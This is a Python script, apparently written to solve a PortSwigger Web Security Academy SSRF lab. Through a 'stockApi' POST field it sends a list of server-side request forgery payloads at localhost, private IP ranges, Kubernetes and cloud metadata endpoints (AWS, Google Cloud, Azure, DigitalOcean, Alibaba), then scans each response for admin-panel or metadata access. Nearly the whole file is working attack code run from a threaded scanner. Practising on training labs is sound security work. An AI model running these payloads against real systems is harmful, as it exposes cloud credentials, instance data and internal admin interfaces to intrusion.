import requests
from urllib.parse import urljoin
import concurrent.futures

# SSRF payloads
payloads = [
    # Localhost and internal IPs
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",  # IPv6 localhost

    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",

    # Google Cloud metadata
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://metadata.google.internal/computeMetadata/v1/instance/hostname",

    # DigitalOcean metadata
    "http://169.254.169.254/metadata/v1.json",

    # Alibaba Cloud metadata
    "http://100.100.100.200/latest/meta-data/",
    
    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    
    # Kubernetes metadata
    "http://kubernetes.default.svc.cluster.local",
    
    # Common private IP ranges
    "http://192.168.0.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    
    # Specific admin interface access
    "http://localhost/admin"
]

# Function to test a single URL with POST request
def test_ssrf_post(base_url):
    for payload in payloads:
        data = {"stockApi": payload}
        try:
            response = requests.post(base_url, data=data, timeout=5)
            analyze_response(response, base_url, payload)
        except requests.RequestException as e:
            print(f"Error testing URL: {base_url} with payload {payload}, {e}")

# Function to analyze the response for SSRF indicators
def analyze_response(response, url, payload=None):
    print(f"Testing payload: {payload} on URL: {url}")
    print(f"Response Status Code: {response.status_code}")
    print(f"Response Headers: {response.headers}")
    print(f"Response Text: {response.text[:500]}")  # Print first 500 characters of response text

    if response.status_code == 200:
        if "Admin interface" in response.text or "/admin/delete?username=carlos" in response.text:
            print(f"Admin interface accessed via SSRF: {url} with payload {payload}")
        elif "Welcome" in response.text or "admin" in response.text.lower():
            print(f"Admin interface accessed via SSRF: {url} with payload {payload}")
        elif "metadata" in response.text:
            print(f"AWS metadata accessed via SSRF: {url} with payload {payload}")
        elif "project-id" in response.text or "hostname" in response.text:
            print(f"Google Cloud metadata accessed via SSRF: {url} with payload {payload}")
        elif "kubernetes" in response.text:
            print(f"Kubernetes metadata accessed via SSRF: {url} with payload {payload}")
        else:
            print(f"No SSRF vulnerability detected: {url} with payload {payload}")
    else:
        print(f"No SSRF vulnerability detected: {url} with payload {payload}")

# Function to scan a list of URLs
def scan_urls(urls):
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        for url in urls:
            print(f"Testing {url}")
            futures.append(executor.submit(test_ssrf_post, url))
        concurrent.futures.wait(futures)

# Main function
def main():
    urls_to_test = [
        "https://0a0200d9044222618175fea1006600b3.web-security-academy.net/product/stock"
        # Add more URLs to test if needed
    ]
    scan_urls(urls_to_test)

if __name__ == "__main__":
    main()
